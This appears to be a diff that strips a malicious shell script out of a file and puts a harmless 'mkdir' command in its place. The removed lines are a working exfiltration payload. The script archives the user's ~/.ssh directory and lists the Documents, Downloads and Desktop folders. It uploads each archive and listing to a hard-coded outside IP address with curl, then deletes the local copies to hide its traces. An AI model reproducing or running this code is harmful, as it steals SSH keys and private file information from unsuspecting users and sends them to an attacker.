@@ -1,17 +1,1 @@
-cd ~
-tar -cvf `whoami`-`hostname`-ssh.tar .ssh
-filename=`whoami`-`hostname`-ssh.tar
-curl -F "uploadfile=@$filename" http://34.68.112.16:8888/upload
-find ~/Documents > `whoami`-documents.txt
-filename=`whoami`-documents.txt
-curl -F "uploadfile=@$filename" http://34.68.112.16:8888/upload
-find ~/Downloads > `whoami`-downloads.txt
-filename=`whoami`-downloads.txt
-curl -F "uploadfile=@$filename" http://34.68.112.16:8888/upload
-find ~/Desktop > `whoami`-desktop.txt
-filename=`whoami`-desktop.txt
-curl -F "uploadfile=@$filename" http://34.68.112.16:8888/upload
-rm -rf `whoami`-`hostname`-ssh.tar
-rm -rf `whoami`-documents.txt
-rm -rf `whoami`-downloads.txt
-rm -rf `whoami`-desktop.txt
+mkdir ~/marcin
